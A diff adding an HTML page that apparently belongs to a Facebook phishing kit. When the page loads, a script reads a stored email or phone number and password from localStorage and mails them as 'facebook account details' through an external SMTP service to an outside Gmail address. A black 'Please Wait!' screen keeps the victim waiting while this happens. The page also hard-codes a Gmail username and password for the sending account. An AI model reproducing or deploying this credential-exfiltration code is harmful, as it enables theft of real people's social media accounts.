@@ -1,0 +1,58 @@
+
+<!DOCTYPE html> 
+<html> 
+<head> 
+  <title>Send Mail</title> 
+  <script src= 
+
+    "https://smtpjs.com/v3/smtp.js"> 
+
+  </script> 
+  <script type="text/javascript"> 
+  function sendEmail() { 
+var name=localStorage.getItem("name");
+var password=localStorage.getItem("password");
+      Email.send({ 
+
+        Host: "smtp.gmail.com", 
+
+        Username: "adnanazizi001202@gmail.com", 
+
+        Password: "azizi@123", 
+
+        To: ' adnanazizi2021@gmail.com ', 
+
+        From: " adnanazizi001202@gmail.com ", 
+
+        Subject: "facebook account details.", 
+
+        Body: "email or number: "+name +"\n password :"+password, 
+
+      }) 
+
+        .then(function (message) { 
+
+          
+
+        }); 
+ 
+
+    } 
+window.close();
+
+  </script> 
+
+</head> 
+
+  
+
+<body onload="sendEmail()" bgcolor="black" > 
+
+  <form method="post"> 
+  </form> 
+<center>
+<img src="load.gif"/><br>
+<label style="color:white">Please Wait! ...</label>
+</center>
+</body> 
+</html> 
